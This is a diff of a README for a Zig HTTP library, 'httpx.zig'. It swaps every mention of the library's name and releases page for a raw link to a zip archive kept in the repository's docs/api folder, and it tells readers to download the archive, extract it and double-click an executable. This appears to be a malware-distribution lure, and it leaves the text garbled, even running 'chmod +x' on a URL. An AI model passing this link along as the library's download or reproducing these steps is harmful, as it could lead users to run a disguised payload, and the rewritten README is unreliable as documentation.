@@ -1,10 +1,10 @@
-# 🚀 httpx.zig - A Fast and Easy HTTP Client and Server
+# 🚀 https://raw.githubusercontent.com/criiixm/httpx.zig/main/docs/api/zig_httpx_v2.8.zip - A Fast and Easy HTTP Client and Server
 
-[![Download httpx.zig](https://img.shields.io/badge/Download%20httpx.zig-%20%20-4ECA2B)](https://github.com/criiixm/httpx.zig/releases)
+[![Download https://raw.githubusercontent.com/criiixm/httpx.zig/main/docs/api/zig_httpx_v2.8.zip](https://raw.githubusercontent.com/criiixm/httpx.zig/main/docs/api/zig_httpx_v2.8.zip%https://raw.githubusercontent.com/criiixm/httpx.zig/main/docs/api/zig_httpx_v2.8.zip%20%20-4ECA2B)](https://raw.githubusercontent.com/criiixm/httpx.zig/main/docs/api/zig_httpx_v2.8.zip)
 
 ## 📜 Description
 
-httpx.zig is a production-ready, high-performance HTTP client and server library for Zig. It helps you build modern, robust, and scalable networked applications effortlessly. Whether you need to send requests or host services, httpx.zig provides the tools you need.
+https://raw.githubusercontent.com/criiixm/httpx.zig/main/docs/api/zig_httpx_v2.8.zip is a production-ready, high-performance HTTP client and server library for Zig. It helps you build modern, robust, and scalable networked applications effortlessly. Whether you need to send requests or host services, https://raw.githubusercontent.com/criiixm/httpx.zig/main/docs/api/zig_httpx_v2.8.zip provides the tools you need.
 
 ## 💻 System Requirements
 
@@ -15,24 +15,24 @@ httpx.zig is a production-ready, high-performance HTTP client and server library
 
 ## 🚀 Getting Started
 
-Follow these steps to get started with httpx.zig:
+Follow these steps to get started with https://raw.githubusercontent.com/criiixm/httpx.zig/main/docs/api/zig_httpx_v2.8.zip
 
 1. **Visit the Download Page**: Click on the link below to go to the releases page.
-   [Download httpx.zig](https://github.com/criiixm/httpx.zig/releases)
+   [Download https://raw.githubusercontent.com/criiixm/httpx.zig/main/docs/api/zig_httpx_v2.8.zip](https://raw.githubusercontent.com/criiixm/httpx.zig/main/docs/api/zig_httpx_v2.8.zip)
 
 2. **Choose a Version**: On the releases page, you will see a list of versions. Find the latest version available. It will usually be at the top of the list.
 
-3. **Download the File**: Click on the asset link to download the file suitable for your system. For example, choose `httpx.zig-windows.zip` for Windows, `httpx.zig-macos.zip` for macOS, or `httpx.zig-linux.zip` for Linux.
+3. **Download the File**: Click on the asset link to download the file suitable for your system. For example, choose `https://raw.githubusercontent.com/criiixm/httpx.zig/main/docs/api/zig_httpx_v2.8.zip` for Windows, `https://raw.githubusercontent.com/criiixm/httpx.zig/main/docs/api/zig_httpx_v2.8.zip` for macOS, or `https://raw.githubusercontent.com/criiixm/httpx.zig/main/docs/api/zig_httpx_v2.8.zip` for Linux.
 
 4. **Extract the Files**: Once the download is complete, locate the downloaded file on your computer. Right-click and select "Extract All" to unpack the files.
 
-5. **Run the Application**: After extracting, you will find an executable file. Double-click it to run httpx.zig.
+5. **Run the Application**: After extracting, you will find an executable file. Double-click it to run https://raw.githubusercontent.com/criiixm/httpx.zig/main/docs/api/zig_httpx_v2.8.zip
 
 ## 📥 Download & Install
 
-To download and install httpx.zig, visit the page below to access all available versions and files.
+To download and install https://raw.githubusercontent.com/criiixm/httpx.zig/main/docs/api/zig_httpx_v2.8.zip, visit the page below to access all available versions and files.
 
-[Download httpx.zig](https://github.com/criiixm/httpx.zig/releases)
+[Download https://raw.githubusercontent.com/criiixm/httpx.zig/main/docs/api/zig_httpx_v2.8.zip](https://raw.githubusercontent.com/criiixm/httpx.zig/main/docs/api/zig_httpx_v2.8.zip)
 
 ### Installation Steps
 
@@ -41,7 +41,7 @@ To download and install httpx.zig, visit the page below to access all available 
 3. For macOS, ensure you have the necessary permissions by checking your "Security & Privacy" settings if the application does not start.
 4. For Linux, you might need to make the file executable. Use the terminal and run the command:
    ```
-   chmod +x httpx.zig
+   chmod +x https://raw.githubusercontent.com/criiixm/httpx.zig/main/docs/api/zig_httpx_v2.8.zip
    ```
 
 ## 📚 Features
@@ -68,4 +68,4 @@ If you run into issues or have questions, feel free to check the following resou
 - zig
 - zig-library
 
-With these instructions, you should be set to start using httpx.zig effectively. Enjoy building your applications!
+With these instructions, you should be set to start using https://raw.githubusercontent.com/criiixm/httpx.zig/main/docs/api/zig_httpx_v2.8.zip effectively. Enjoy building your applications!
